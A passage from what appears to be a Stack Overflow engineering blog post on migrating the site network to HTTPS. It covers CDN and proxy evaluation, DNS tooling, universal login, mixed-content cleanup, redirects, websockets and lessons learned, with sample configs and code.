(299,792,458 m/s * .70) = 0.191 seconds, or 191ms for a round-trip in the worst case, right? Well\u2026no, not really.  That\u2019s also assuming an optimal path, but going between two destinations on the internet is very rarely a straight line. There are routers, switches, buffers, processor queues, and all sorts of additional little delays in the way.  They add up to measurable latency. Let\u2019s not even talk about Mars, yet. So why does that matter to Stack Overflow? This is an area where the cloud wins. It\u2019s very likely that the server you\u2019re hitting with a cloud provider is relatively local. With us, it\u2019s not. With a direct connection, the further you get away from our New York or Denver data centers (whichever one is active), the slower your experience gets. When it comes to HTTPS, there\u2019s an additional round trip to negotiate the connection before any data is sent. That\u2019s under the best of circumstances (though that\u2019s improving with TLS 1.3 and 0-RTT). And Ilya Grigorik has a great summary here. Enter Cloudflare and Fastly. HTTPS wasn\u2019t a project deployed in a silo; as you read on, you\u2019ll see that several other projects multiplex in along the way. In the case of a local-to-the-user HTTPS termination endpoint (to minimize that round trip duration), we were looking for a few main criteria:  Local HTTPS termination DDoS protection CDN functionality Performance equivalent or better than direct-to-us  Preparing for a Proxy: Client Timings Before moving to any proxy, testing for performance had to be in place. To do this, we set up a full pipeline of timings to get performance metrics from browsers. For years now, browsers have included performance timings accessible via JavaScript, via window.performance. Go ahead, open up the inspector and try it! We want to be very transparent about this, that\u2019s why details have been available on teststackoverflow.com since day 1. There\u2019s no sensitive data transferred, only the URIs of resources directly loaded by the page and their timings. For each page load recorded, we get timings that look like this:  Currently we attempt to record performance timings from 5% of traffic. The process isn\u2019t that complicated, but all the pieces had to be built:  Transform the timings into JSON Upload the timings after a page load completes Relay those timings to our backend Traffic Processing Service (it has reports) Store those timings in a clustered columnstore in SQL Server Relay aggregates of the timings to Bosun (via BosunReporter.NET)  The end result is we now have a great real-time overview of actual user performance all over the world that we can readily view, alert on, and use for evaluating any changes. Here\u2019s a view of timings coming in live:  Luckily, we have enough sustained traffic to get useful data here. At this point, we have over 5 billion points (and growing) of data to help drive decisions. Here\u2019s a quick overview of that data:  Okay, so now we have our baseline data.  Time to test candidates for our CDN/Proxy setup. Cloudflare We evaluated many CDN/DDoS proxy providers. We picked Cloudflare based on their infrastructure, responsiveness, and the promise of Railgun. So how can we do test what life would be like behind Cloudflare all over the world? How many servers would we need to set up to get enough data points? None! Stack Overflow has an excellent resource here: billions of hits a month.  Remember those client timings we just talked about? We already have tens of millions of users hitting us every day, so why don\u2019t we ask them? We can do just that, by embedding an <iframe> in Stack Overflow pages. Cloudflare was already our cdn.sstatic.net host (our shared, cookieless static content domain) from earlier. But, this was done with a CNAME DNS record, we served the DNS which pointed at their DNS. To use Cloudflare as a proxy though, we needed them to serve our DNS. So first, we needed to test performance of their DNS. Practically speaking, to test performance we needed to delegate a second-level domain to them, not something.stackoverflow.com, which would have different glue records and sometimes isn\u2019t handled the same way (causing 2 lookups). To clarify, Top-Level Domains (TLDs) are things like .com, .net, .org, .dance, .duck, .fail, .gripe, .here, .horse, .ing, .kim, .lol, .ninja, .pink, .red, .vodka. and .wtf. Nope, I\u2019m not kidding (and here\u2019s the full list). Second-Level Domains (SLDs) are one level below, what most sites would be: stackoverflow.com, superuser.com, etc. That\u2019s what we need to test the behavior and performance of. Thus, teststackoverflow.com was born. With this new domain, we could test DNS performance all over the world. By embedding the <iframe> for a certain percentage of visitors (we turned it on and off for each test), we could easily get data from each DNS and hosting configuration. Note that it\u2019s important to test for ~24hours at a minimum here.  The behavior of the internet changes throughout the day as people are awake or asleep or streaming Netflix all over the world as it rolls through time zones. So to measure a single country, you really want a full day.  Within weekdays, preferably (e.g. not half into a Saturday). Also be aware that shit happens.  It happens all the time.  The performance of the internet is not a stable thing, we\u2019ve got the data to prove it. Our initial assumptions going into this was we\u2019d lose some page load performance going through Cloudflare (an extra hop almost always adds latency), but we\u2019d make it up with the increases in DNS performance. The DNS side of this paid off.  Cloudflare had DNS servers far more local to the users than we do in a single data center. The performance there was far better. I hope that we can find the time to release this data soon.  It\u2019s just a lot to process (and host), and time isn\u2019t something I have in ample supply right now. Then we began testing page load performance by proxying teststackoverflow.com through Cloudflare, again in the <iframe>. We saw the US and Canada slightly slower (due to the extra hop), but the rest of the world on par or better. This lined up with expectations overall, and we proceeded with a move behind Cloudflare\u2019s network. A few DDoS attacks along the way sped up this migration a bit, but that\u2019s another story. Why did we accept slightly slower performance in the US and Canada?  Well at ~200-300ms page loads for most pages, that\u2019s still pretty damn fast. But we don\u2019t like to lose. We thought Railgun would help us win that performance back. Once all the testing panned out, we needed to put the pieces in for DDoS protection. This involved installing additional, dedicated ISPs in our data center for the CDN/Proxy to connect to. After all, DDoS protection via a proxy isn\u2019t very effective if you can just go around it. This meant we were serving off of 4 ISPs per data center now, with 2 sets of routers, all running BGP with full tables. It also meant 2 new load balancers, dedicated to CDN/Proxy traffic. Cloudflare: Railgun At the time, this setup also meant 2 more boxes just for Railgun.  The way Railgun works is by caching the last result of that URL in memcached locally and on Cloudflare\u2019s end. When Railgun is enabled, every page (under a size threshold) is cached on the way out. On the next request, if the entry was in Cloudflare\u2019s edge cache and our cache (keyed by URL), we still ask the web server for it. But instead of sending the whole page back to Cloudflare, it only sends a diff. That diff is applied to their cache and served back to the client. By nature of the pipe, it also meant the gzip compression for transmission moved from 9 web servers for Stack Overflow to the 1 active Railgun box\u2026so this had to be a pretty CPU-beefy machine. I point this out because all of this had to be evaluated, purchased and deployed on our way. As an example, think about 2 users viewing a question.  Take a picture of each browser. They\u2019re almost the same page, so that\u2019s a very small diff. It\u2019s a huge optimization if we can send only that diff down most of the journey to the user. Overall, the goal here is to reduce the amount of data sent back in hopes of a performance win. And when it worked, that was indeed the case. Railgun also had another huge advantage: requests weren\u2019t fresh connections. Another consequence of latency is the duration and speed of the ramp up of TCP slow start, part of the congestion control that keeps the Internet flowing. Railgun maintains a constant connection to Cloudflare edges and multiplexes user requests, all of them over a pre-primed connection not heavily delayed by slow start. The smaller diffs also lessened the need for ramp up overall. Unfortunately, we never got Railgun to work without issues in the long run.  To my knowledge, we were (at the time) the largest deployment of the technology and we stressed it further than it has been pushed before. Though we tried to troubleshoot it for over a year, we ultimately gave up and moved on. It simply wasn\u2019t saving us more than it was costing us in the end. It\u2019s been several years now, though. If you\u2019re evaluating Railgun, you should evaluate the current version, with the improvements they\u2019ve made, and decide for yourself. Fastly Moving to Fastly was relatively recent, but since we\u2019re on the CDN/Proxy topic I\u2019ll cover it now. The move itself wasn\u2019t terribly interesting because most of the pieces needed for any proxy were done in the Cloudflare era above. But of course everyone will ask: why did we move? While Cloudflare was very appealing in many regards - mainly, many data centers, stable bandwidth pricing, and included DNS - it wasn\u2019t the best fit for us anymore. We needed a few things that Fastly simply did to fit us better: more flexibility at the edge, faster change propagation, and the ability to fully automate configuration pushes. That\u2019s not to say Cloudflare is bad, it was just no longer the best fit for Stack Overflow. Since actions speak louder: If I didn\u2019t think highly of Cloudflare, my personal blog wouldn\u2019t be behind them right now. Hi there! You\u2019re reading it. The main feature of Fastly that was so compelling to us was Varnish and the VCL. This makes the edge highly configurable. So features that Cloudflare couldn\u2019t readily implement (as they might affect all customers), we could do ourselves. This is simply a different architectural approach to how these two companies work, and the highly-configurable-in-code approach suits us very well. We also liked how open they were with details of infrastructure at conferences, in chats, etc. Here\u2019s an example of where VCL comes in very handy.  Recently we deployed .NET 4.6.2 which had a very nasty bug that set max-age on cache responses to over 2000 years. The quickest way to mitigate this for all of our services affected was to override that cache header as-needed at the edge. As I write this, the following VCL is active: sub vcl_fetch {   if (beresp.http.Cache-Control) {       if (req.url.path ~ \"^/users/flair/\") {           set beresp.http.Cache-Control = \"public, max-age=180\";       } else {           set beresp.http.Cache-Control = \"private\";       }   }  This allows us to cache user flair for 3 minutes (since it\u2019s a decent volume of bytes), and bypass everything else.  This is an easy-to-deploy global solution to workaround an urgent cache poisoning problem across all applications. We\u2019re very, very happy with all the things we\u2019re able to do at the edge now. Luckily we have Jason Harvey who picked up the VCL bits and wrote automated-pushed of our configs. We had to improve on existing libraries in Go here, so check out fastlyctl, another open source bit to come out of this. Another important facet of Fastly (that Cloudflare also had, but we never utilized due to cost) is using your own certificate. As we covered earlier, we\u2019re already using this in preparation for HTTP/2 pushes. But, Fastly doesn\u2019t do something Cloudflare does: DNS. So we need to solve that now. Isn\u2019t this dependency chain fun? Global DNS When moving from Cloudflare to Fastly, we had to evaluate and deploy new (to us) global DNS providers. That in itself in an entirely different post, one that\u2019s been written by Mark Henderson. Along the way, we were also controlling:  Our own DNS servers (still up as a fall back) Name.com servers (for redirects not needing HTTPS) Cloudflare DNS Route 53 DNS Google DNS Azure DNS \u2026and several others (for testing)  This was a whole project in itself.  We had to come up with  means to do this efficiently, and so DNSControl was born. This is now an open source project, available on GitHub, written in Go. In short: we push a change in the JavaScript config to git, and it\u2019s deployed worldwide in under a minute. Here\u2019s a sample config from one of our simpler-in-DNS sites, askubuntu.com: D('askubuntu.com', REG_NAMECOM,     DnsProvider(R53,2),     DnsProvider(GOOGLECLOUD,2),     SPF,     TXT('@', 'google-site-verification=PgJFv7ljJQmUa7wupnJgoim3Lx22fbQzyhES7-Q9cv8'), // webmasters     A('@', ADDRESS24, FASTLY_ON),     CNAME('www', '@'),     CNAME('chat', 'chat.stackexchange.com.'),     A('meta', ADDRESS24, FASTLY_ON), END)  Okay great, how do you test that all of this is working? Client Timings!  The ones we covered above let us test all of this DNS deployment with real-world data, not simulations.  But we also need to test that everything just works. Testing Client Timings in deploying the above was very helpful for testing performance. But it wasn\u2019t good for testing configuration. After all, Client Timings is awesome for seeing the result, but most configuration missteps result in no page load, and therefore no timings at all. So we had to build httpUnit (yes, the team figured out the naming conflict later\u2026). This is now another open source project written in Go. An example config for teststackoverflow.com: [[plan]]   label = \"teststackoverflow_com\"   url = \"http://teststackoverflow.com\"   ips = [\"28i\"]   text = \"<title>Test Stack Overflow Domain</title>\"   tags = [\"so\"] [[plan]]   label = \"tls_teststackoverflow_com\"   url = \"https://teststackoverflow.com\"   ips = [\"28\"]   text = \"<title>Test Stack Overflow Domain</title>\"   tags = [\"so\"]  It was important to test as we changed firewalls, certificates, bindings, redirects, etc. along the way. We needed to make sure every change was good before we activated it for users (by deploying it on our secondary load balancers first). httpUnit is what allowed us to do that and run an integration test suite to ensure we had no regressions. There\u2019s another tool we developed internally (by our lovely Tom Limoncelli) for more easily managing Virtual IP Address groups on our load balancers. We test on the inactive load balancer via a secondary range, then move all traffic over, leaving the previous master in a known-good state. If anything goes wrong, we flip back. If everything goes right (yay!), we apply changes to that load balancer as well. This tool is called keepctl (short for keepalived control) - look for this to be open sourced as soon as time allows. Preparing the Applications Almost all of the above has been just the infrastructure work. This is generally done by a team of several other Site Reliability Engineers at Stack Overflow and I getting things situated. There\u2019s also so much more that needed doing inside the applications themselves. It\u2019s a long list. I\u2019d grab some coffee and a Snickers. One important thing to note here is that the architecture of Stack Overflow & Stack Exchange Q&A sites is multi-tenant. This means that if you hit stackoverflow.com or superuser.com or bicycles.stackexchange.com, you\u2019re hitting the exact same thing. You\u2019re hitting the exact same w3wp.exe process on the exact same server. Based on the Host header the browser sends, we change the context of the request. Several pieces of what follows will be clearer if you understand Current.Site in our code is the site of the request. Things like Current.Site.Url() and Current.Site.Paths.FaviconUrl are all driven off this core concept. Another way to make this concept/setup clearer: we can run the entire Q&A network off of a single process on a single server and you wouldn\u2019t know it. We run a single process today on each of 9 servers purely for rolling builds and redundancy. Global Login Quite a few of these projects seemed like good ideas on their own (and they were), but were part of a bigger HTTPS picture. Login was one of those projects. I\u2019m covering it first, because it was rolled out much earlier than the other changes below. For the first 5-6 years Stack Overflow (and Stack Exchange) existed, you logged into a particular site. As an example, each of stackoverflow.com, stackexchange.com, and gaming.stackexchange.com had their own per-site cookies. Of note here: meta.gaming.stackexchange.com\u2019s login depended on the cookie from gaming.stackexchange.com flowing to the subdomain.  These are the \u201cmeta\u201d sites we talked about with certificates earlier. Their logins were tied together, you always logged in through the parent. This didn\u2019t really matter much technically, but from a user experience standpoint it sucked. You had to login to each site. We \u201cfixed\u201d that with \u201cglobal auth\u201d, which was an <iframe> in the page that logged everyone in through stackauth.com if they were logged in elsewhere. Or it tried to. The experience was decent, but a popup bar telling you to click to reload and be logged in wasn\u2019t really awesome.  We could do better. Oh and ask Kevin Montrose about mobile Safari private mode. I dare you. Enter \u201cUniversal Login\u201d. Why the name \u201cUniversal\u201d? Because global was taken. We\u2019re simple people. Luckily, cookies are also pretty simple. A cookie present on a parent domain (e.g. stackexchange.com) will be sent by your browser to all subdomains (e.g. gaming.stackexchange.com). When you zoom out from our network, we have only a handful of second-level domains:  askubuntu.com mathoverflow.net serverfault.com stackapps.com stackexchange.com stackoverflow.com superuser.com  Yes, we have other domains that redirect to these, like askdifferent.com.  But they\u2019re only redirects and don\u2019t have cookies or logged-in users. There\u2019s a lot of backend work that I\u2019m glossing over here (props to Geoff Dalgas and Adam Lear especially), but the general gist is that when you login, we set a cookie on these domains. We do this via third-party cookies and nonces. When you login to any of the above domains, 6 cookies are issued via <img> tags on the destination page for the other domains, effectively logging you in. This doesn\u2019t work everywhere (in particular, mobile safari is quirky), but it\u2019s a vast improvement over previous. The client code isn\u2019t complicated, here\u2019s what it looks like: $.post('/users/login/universal/request', function (data, text, req) {     $.each(data, function (arrayId, group) {         var url = '//' + group.Host + '/users/login/universal.gif?authToken=' +            encodeURIComponent(group.Token) + '&nonce=' + encodeURIComponent(group.Nonce);         $(function () { $('#footer').append('<img style=\"display:none\" src=\"' + url + '\"></img>'); });     }); }, 'json');  \u2026but to do this, we have to move to Account-level authentication (it was previously user level), change how cookies are viewed, change how child-meta login works, and also provide integration for these new bits to other applications. For example, Careers (now Talent and Jobs) is a different codebase. We needed to make those applications view the cookies and call into the Q&A application via an API to get the account. We deploy this via a NuGet library to minimize repeated code. Bottom line: you login once and you are logged into all domains. No messages, no page reloads. For the technical side, we now don\u2019t have to worry about where the *.*.stackexchange.com domains are.  As long as they\u2019re under stackexchange.com, we\u2019re good.  While on the surface this had nothing to do with HTTPS, it allowed us to move things like meta.gaming.stackexchange.com to gaming.meta.stackexchange.com without any interruptions to users. It\u2019s one giant, really ugly puzzle. Local HTTPS Development To make any kind of progress here, local environments need to match dev and production as much as possible. Luckily, we\u2019re on IIS which makes this fairly straightforward to do. There\u2019s a tool we use to setup developer environments called \u201cdev local setup\u201d because, again, we\u2019re simple people. It installs tooling (Visual Studio, git, SSMS, etc.), services (SQL Server, Redis, Elasticsearch), repositories, databases, websites, and a few other bits. We had the basic tooling setup, we just needed to add SSL/TLS certs. An abbreviated setup for Core looks like this: Websites = @(     @{         Directory = \"StackOverflow\";         Site = \"local.mse.com\";         Aliases = \"discuss.local.area51.lse.com\", \"local.sstatic.net\";         Databases = \"Sites.Database\", \"Local.StackExchange.Meta\", \"Local.Area51\", \"Local.Area51.Meta\";         Certificate = $true;     },     @{         Directory = \"StackExchange.Website\";         Site = \"local.lse.com\";         Databases = \"Sites.Database\", \"Local.StackExchange\", \"Local.StackExchange.Meta\", \"Local.Area51.Meta\";         Certificate = $true;     } )  And the code that uses this I\u2019ve put in a gist here: Register-Websites.psm1. We setup our websites via host headers (adding those in aliases), give them certificates if directed (hmmm, we should default this to $true now\u2026), and grant those AppPool accounts access to the databases. Okay, so now we\u2019re set to develop against https:// locally. Yes, I know - we really should open source this setup, but we have to strip out some specific-to-us bits in a fork somehow. One day. Why is this important? Before this, we loaded static content from /content, not from another domain. This was convenient, but also hid issues like Cross-Origin Requests (or CORS). What may load just fine on the same domain on the same protocol may readily fail in dev and production. \u201cIt works on my machine.\u201d By having a CDN and app domains setup with the same protocols and layout we have in production, we find and fix many more issues before they leave a developer\u2019s machine. For example, did you know that when going from an https:// page to an http:// one, the browser does not send the referer? It\u2019s a security issue, there could be sensitive bits in the URL that would be sent over paintext in the referer header. \u201cThat\u2019s bullshit Nick, we get Google referers!\u201d Well, yes. You do. But because they explicitly opt into it. If you look at the Google search page, you\u2019ll find this <meta> directive: <meta content=\"origin\" id=\"mref\" name=\"referrer\">  \u2026and that\u2019s why you get it from them. Okay, we\u2019re setup to build some stuff, where do we go from here? Mixed Content: From You This one has a simple label with a lot of implications for a site with user-submitted content. What kind of mixed content problems had we accumulated over the years? Unfortunately, quite a few. Here\u2019s the list of user-submitted content we had to tackle:  http:// images in questions, answers, tags, wikis, etc. (all post types) http:// avatars http:// avatars in chat (which appear on the site in the sidebar) http:// images in \u201cabout me\u201d sections of profiles http:// images in help center articles http:// YouTube videos (some sites have this enabled, like gaming.stackexchange.com) http:// images in privilege descriptions http:// images in developer stories http:// images in job descriptions http:// images in company pages http:// sources in JavaScript snippets.  Each of these had specific problems attached, I\u2019ll stick to the interesting bits here. Note: each of the solutions I\u2019m talking about has to be scaled to run across hundreds of sites and databases given our architecture. In each of the above cases (except snippets), there was a common first step to eliminating mixed content. You need to eliminate new mixed content. Otherwise, all cleanups continue indefinitely. Plug the hole, then drain the ship. To that end, we started enforcing only https://-only image embeds across the network. Once that was done and holes were plugged, we could get to work cleaning up. For images in questions, answers, and other post types we had to do a lot of analysis and see what path to take. First, we tackled the known 90%+ case: stack.imgur.com. Stack Overflow has its own hosted instance of Imgur since before my time. When you upload an image with our editor, it goes there. The vast majority of posts take this approach, and they added proper HTTPS support for us years ago. This was a straight-forward find and replace re-bake (what we call re-processing post markdown) across the board. Then, we analyzed all the remaining image paths via our Elasticsearch index of all content. And by we, I mean Samo. He put in a ton of work on mixed-content throughout this. After seeing that many of the most repetitive domains actually supported HTTPS, we decided to:  Try each <img> source on https:// instead. If that worked, replace the link in the post. If the source didn\u2019t support https://, convert it to a link.  But of course, that didn\u2019t actually just work.  It turns out the regex to match URLs in posts was broken for years and no one noticed\u2026so we fixed that and re-indexed first. Oops. We\u2019ve been asked: \u201cwhy not just proxy it?\u201d Well, that\u2019s a legally and ethically gray area for much of our content. For example, we have photographers on photo.stackexchange.com that explicitly do not use Imgur to retain all rights. Totally understandable. If we start proxying and caching the full image, that gets legally tricky at best really quick. It turns out that out of millions of image embeds on the network, only a few thousand both didn\u2019t support https:// and weren\u2019t already 404s anyway. So, we elected to not build a complicated proxy setup. The percentages (far less than 1%) just didn\u2019t come anywhere close to justifying it. We did research building a proxy though. What would it cost? How much storage would we need? Do we have enough bandwidth? We found estimates to all these questions, with some having various answers. For example, do we use Fastly site shield, or take the bandwidth brunt over the ISP pipes? Which option is faster? Which option is cheaper? Which option scales? Really, that\u2019s another blog post all by itself, but if you have specific questions ask them in comments and I\u2019ll try to answer. Luckily, along the way balpha had revamped YouTube embeds to fix a few things with HTML5. The rebake forced https:// for all as a side effect, yay! All done. The rest of the content areas were the same story: kill new mixed-content coming in, and replace what\u2019s there. This required changes in the following code areas:  Posts Profiles Dev Stories Help Center Jobs/Talent Company Pages  Disclaimer: JavaScript snippets remains unsolved. It\u2019s not so easy because:  The resource you want may not be available over https:// (e.g. a library) Due it being JavaScript, you could just construct any URL you want. This is basically impossible to check for.      If you have a clever way to do this, please tell us. We\u2019re stuck on usability vs. security on that one.    Mixed Content: From Us Problems don\u2019t stop at user-submitted content. We have a fair bit of http:// baggage as well. While the moves of these things aren\u2019t particularly interesting, in the interest of \u201cwhat took so long?\u201d they\u2019re at least worth enumerating:  Ad Server (Calculon) Ad Server (Adzerk) Tag Sponsorships JavaScript assumptions Area 51 (the whole damn thing really - it\u2019s an ancient codebase) Analytics trackers (Quantcast, GA) Per-site JavaScript includes (community plugins) Everything under /jobs on Stack Overflow (which is actually a proxy, surprise!) User flair \u2026and almost anywhere else http:// appears in code  JavaScript and links were a bit painful, so I\u2019ll cover those in a little detail. JavaScript is an area some people forget, but of course it\u2019s a thing. We had several assumptions about http:// in our JavaScript where we only passed a host down. There were also many baked-in assumptions about meta. being the prefix for meta sites. So many. Oh so many. Send help. But they\u2019re gone now, and the server now renders the fully qualified site roots in our options object at the top of the page. It looks something like this (abbreviated): StackExchange.init({   \"locale\":\"en\",   \"stackAuthUrl\":\"https://stackauth.com\",   \"site\":{     \"name\":\"Stack Overflow\"     \"childUrl\":\"https://meta.stackoverflow.com\",     \"protocol\":\"http\"   },   \"user\":{     \"gravatar\":\"<div class=\\\"gravatar-wrapper-32\\\"><img src=\\\"https://i.stack.imgur.com/nGCYr.jpg\\\"></div>\",     \"profileUrl\":\"https://stackoverflow.com/users/13249/nick-craver\"   } });  We had so many static links over the years in our code.  For example, in the header, in the footer, in the help section\u2026just all over the place. For each of these, the solution wasn\u2019t that complicated: change them to use <site>.Url(\"/path\"). Finding and killing these was a little fun because you can\u2019t just search for \"http://\". Thank you so much W3C for gems like this: <svg xmlns=\"http://www.w3.org/2000/svg\"...  Yep, those are identifiers. You can\u2019t change them. This is why I want Visual Studio to add an \u201cexclude file types\u201d option to the find dialog. Are you listening Visual Studio??? VS Code added it a while ago. I\u2019m not above bribery. Okay so this isn\u2019t really fun, it\u2019s hunt and kill for over a thousand links in our code (including code comments, license links, etc.) But, that\u2019s life. It had to be done. By converting them to be method calls to .Url(), we made the links dynamically switch to HTTPS when the site was ready. For example, we couldn\u2019t switch meta.*.stackexchange.com sites over until they moved. The password to our data center is pickles. I didn\u2019t think anyone would read this far and it seemed like a good place to store it. After they moved, .Url() would keep working, and enabling .Url() rendering https-by-default would also keep working. It changed a static thing to a dynamic thing and appropriately hooked up all of our feature flags. Oh and another important thing: it made dev and local environments work correctly, rather than always linking to production. This was pretty painful and boring, but a worthwhile set of changes. And yes, this .Url() code includes canonicals, so Google sees that pages should be HTTPS as soon as users do. Once a site is moved to HTTPS (by enabling a feature flag), we then crawled the network to update the links to it. This is to both correct \u201cGoogle juice\u201d as we call it, and to prevent users eating a 301. Redirects (301s) When you move a site from HTTP, there are 2 critical things you need to do for Google:  Update the canonical links, e.g. <link rel=\"canonical\" href=\"https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags/1732454\" /> 301 the http:// link to the https:// version  This isn\u2019t complicated, it isn\u2019t grand, but it\u2019s very, very important. Stack Overflow gets most of its traffic from Google search results, so it\u2019s imperative we don\u2019t adversely affect that. I\u2019d literally be out of a job if we lost traffic, it\u2019s our livelihood. Remember those .internal API calls? Yeah, we can\u2019t just redirect everything either. So there\u2019s a bit of logic into what gets redirected (e.g. we don\u2019t redirect POST requests during the transition\u2026browsers don\u2019t handle that well), but it\u2019s fairly straightforward. Here\u2019s the actual code: public static void PerformHttpsRedirects() {     var https = Settings.HTTPS;     // If we're on HTTPS, never redirect back     if (Request.IsSecureConnection) return;      // Not HTTPS-by-default? Abort.     if (!https.IsDefault) return;     // Not supposed to redirect anyone yet? Abort.     if (https.RedirectFor == SiteSettings.RedirectAudience.NoOne) return;     // Don't redirect .internal or any other direct connection     // ...as this would break direct HOSTS to webserver as well     if (RequestIPIsInternal()) return;      // Only redirect GET/HEAD during the transition - we'll 301 and HSTS everything in Fastly later     if (string.Equals(Request.HttpMethod, \"GET\", StringComparison.InvariantCultureIgnoreCase)         || string.Equals(Request.HttpMethod, \"HEAD\", StringComparison.InvariantCultureIgnoreCase))     {         // Only redirect if we're redirecting everyone, or a crawler (if we're a crawler)         if (https.RedirectFor == SiteSettings.RedirectAudience.Everyone             || (https.RedirectFor == SiteSettings.RedirectAudience.Crawlers && Current.IsSearchEngine))         {             var resp = Context.InnerHttpContext.Response;             // 301 when we're really sure (302 is the default)             if (https.RedirectVia301)             {                 resp.RedirectPermanent(Site.Url(Request.Url.PathAndQuery), false);             }             else             {                 resp.Redirect(Site.Url(Request.Url.PathAndQuery), false);             }             Context.InnerHttpContext.ApplicationInstance.CompleteRequest();         }     } }  Note that we don\u2019t start with a 301 (there\u2019s a .RedirectVia301 setting for this), because you really want to test these things carefully before doing anything permanent. We\u2019ll talk about HSTS and permanent consequences a bit later. Websockets This one\u2019s a quick mention. Websockets was not hard, it was the easiest thing we did\u2026in some ways. We use websockets for real-time updates to users like reputation changes, inbox notifications, new questions being asked, new answers added, etc. This means that basically for every page open to Stack Overflow, we have a corresponding websocket connection to our load balancer. So what\u2019s the change? Pretty simple: install a certificate, listen on :443, and use wss://qa.sockets.stackexchange.com instead of the ws:// (insecure) version. The latter of that was done above in prep for everything (we decided on a specific certificate here, but nothing special). The ws:// to wss:// change was simply a configuration one. During the transition we had ws:// with wss:// as a fallback, but this has since become only wss://. The reasons to go with secure websockets in general are 2-fold:  It\u2019s a mixed content warning on https:// if you don\u2019t. It supports more users, due to many old proxies not handling websockets well. With encrypted traffic, most pass it along without screwing it up. This is especially true for mobile users.  The big question here was: \u201ccan we handle the load?\u201d Our network handles quite a few concurrent websockets; as I write this we have over 600,000 concurrent connections open.  Here\u2019s a view of our HAProxy dashboard in Opserver:  That\u2019s a lot of connections on a) the terminators, b) the abstract named socket, and c) the frontend. It\u2019s also much more load in HAProxy itself, due to enabling TLS session resumption. To enable a user to reconnect faster the next time, the first negotiation results in a token a user can send back the next time. If we have enough memory and the timeout hasn\u2019t passed, we\u2019ll resume that session instead of negotiating a new session every time. This saves CPU and improves performance for users, but it has a cost in memory. This cost varies by key size (2048, 4096 bits? more?). We\u2019re currently at 4,096 bit keys. With about 600,000 websockets open at any given time (the majority of our memory usage), we\u2019re still sitting at only 19GB of RAM utilized on our 64GB load balancers. Of this, about 12GB is being utilized by HAProxy, and most of that is the TLS session cache. So\u2026it\u2019s not too bad, and if we had to buy RAM, it\u2019d still be one of the cheapest things about this move.  Unknowns I guess now\u2019s a good time to cover the unknowns (gambles really) we took on with this move. There are a few things we couldn\u2019t really know until we tested out an actual move:  How Google Analytics traffic appeared (Do we lose referers?) How Google Webmasters transitions worked (Do the 301s work? The canonicals? The sitemaps? How fast?) How Google search analytics worked (do we see search analytics in https://?) Will we fall in search result rankings? (scariest of all)  There\u2019s a lot of advice out there of people who have converted to https://, but we\u2019re not the usual use case. We\u2019re not a site. We\u2019re a network of sites across many domains. We have very little insight into how Google treats our network. Does it know stackoverflow.com and superuser.com are related? Who knows. And we\u2019re not holding our breath for Google to give us any insight. So, we test. In our network-wide rollout, we tested a few domains first:  meta.stackexchange.com security.stackexchange.com superuser.com  These were chosen super carefully after a detailed review in a 3-minute meeting between Samo and I. Meta because it\u2019s our main feedback site (that the announcement is also on). Security because they have experts who may notice problems other sites don\u2019t, especially in the HTTPS space. And last, Super User. We needed to test the search impact of our content.  While meta and security are smaller and have relatively smaller traffic levels, Super User gets significantly more traffic. More importantly, it gets this traffic from Google, organically. The reason for a long delay between Super User and the rest of the network is we were watching and assessing the search impact. As far as we can tell: there was barely any. The amount of week-to-week change in searches, results, clicks, and positions is well within the normal up/down noise. Our company depends on this traffic. This was incredibly important to be damn sure about. Luckily, we were concerned for little reason and could continue rolling out. Mistakes Writing this post isn\u2019t a very decent exercise if I didn\u2019t also cover our screw-ups along the way. Failure is always an option. We have the experience to prove it. Let\u2019s cover a few things we did and ended up regretting along the way. Mistakes: Protocol-Relative URLs When you have a URL to a resource, typically you see something like http://example.com or https://example.com, this includes paths for images, etc. Another option you can use is //example.com. These are called protocol-relative URLs. We used these early on for images, JavaScript, CSS, etc. (that we served, not user-submitted content). Years later, we found out this was a bad idea, at least for us. The way protocol-relative links work is they are relative to the page. When you\u2019re on http://stackoverflow.com, //example.com is the same as http://example.com, and on https://stackoverflow.com, it\u2019s the same as https://example.com. So what\u2019s the problem? Well, URLs to images aren\u2019t only used in pages, they\u2019re also used in places like email, our API, and mobile applications. This bit us once when I normalized the pathing structure and used the same image paths everywhere. While the change drastically reduced code duplication and simplified many things, the result was protocol-relative URLs in email. Most email clients (appropriately) don\u2019t render such images.  Because they don\u2019t know which protocol.  Email is neither http:// nor https://.  You may just be viewing it in a web browser and it might have worked. So what do we do? Well, we switched everything everywhere to https://. I unified all of our pathing code down to 2 variables: the root of the CDN, and the folder for the particular site. For example Stack Overflow\u2019s stylesheet resides at: https://cdn.sstatic.net/Sites/stackoverflow/all.css (but with a cache breaker!).  Locally, it\u2019s https://local.sstatic.net/Sites/stackoverflow/all.css.  You can see the similarity. By calculating all routes, life is simpler. By enforcing https://, people are getting the benefits of HTTP/2 even before the site itself switches over, since static content was already prepared. All https:// also meant we could use one property for a URL in web, email, mobile, and API. The unification also meant we have a consistent place to handle all pathing - this means cache breakers are built in everywhere, while still being simpler. Note: when you\u2019re cache breaking resources like we do, for example: https://cdn.sstatic.net/Sites/stackoverflow/all.css?v=070eac3e8cf4, please don\u2019t do it with a build number. Our cache breakers are a checksum of the file, which means you only download a new copy when it actually changes. Doing a build number may be slightly simpler, but it\u2019s likely quite literally costing you money and performance at the same time. Okay, all of that\u2019s cool - so why the hell didn\u2019t we just do this from the start? Because HTTPS, at the time, was a performance penalty. Users would have suffered slower load times on http:// pages. For an idea of scale: we served up 4 billion requests on sstatic.net last month, totaling 94TB. That would be a lot of collective latency back when HTTPS was slower. Now that the tables have turned on performance with HTTP/2 and our CDN/proxy setup, it\u2019s a net win for most users as well as being simpler. Yay! Mistakes: APIs and .internal So what did we find when we got the proxies up and testing? We forgot something critical. I forgot something critical. We use HTTP for a truckload of internal APIs. Oh, right. Dammit. While these continued to work, they got slower, more complicated, and more brittle at the same time. Let\u2019s say an internal API hits stackoverflow.com/some-internal-route. Previously, the hops there were:  Origin app Gateway/Firewall (exiting to public IP space) Local load balancer Destination web server  This was because stackoverflow.com used to resolve to us.  The IP it went to was our load balancer. In a proxy scenario, in order for users to hit the nearest hop to them, they\u2019re hitting a different IP and destination. The IP their DNS resolves to is the CDN/Proxy (Fastly) now. Well, crap. That means our path to the same place is now:  Origin app Gateway/Firewall (exiting to public IP space) Our external router ISP (multiple hops) Proxy (Cloudflare/Fastly) ISPs (proxy path to us) Our external router Local load balancer Destination web server  Okay\u2026that seems worse.  To make an application call from A to B, we have a drastic increase in dependencies that aren\u2019t necessary and kill performance at the same time. I\u2019m not saying our proxy is slow, 